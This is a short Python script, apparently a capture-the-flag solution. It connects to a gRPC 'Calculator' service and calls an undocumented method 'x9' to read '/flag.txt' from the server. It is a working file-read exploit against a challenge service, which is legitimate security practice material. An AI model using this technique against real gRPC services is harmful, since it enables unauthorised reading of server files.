import grpc
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
import challenge.common.calculator_pb2 as calculator_pb2 #the generated file from proto or we can use the one found of NFS mounted dir
import challenge.common.calculator_pb2_grpc as calculator_pb2_grpc #the generated file from proto

def run():
    channel = grpc.insecure_channel('localhost:8888') #nexus-security.club:8888
    stub = calculator_pb2_grpc.CalculatorStub(channel)

    file_req = calculator_pb2.FileRequest(path="/flag.txt")
    file_res = stub.x9(file_req)
    print("File content:", file_res.content, "Errno:", file_res.errno)

if __name__ == '__main__':
    run()
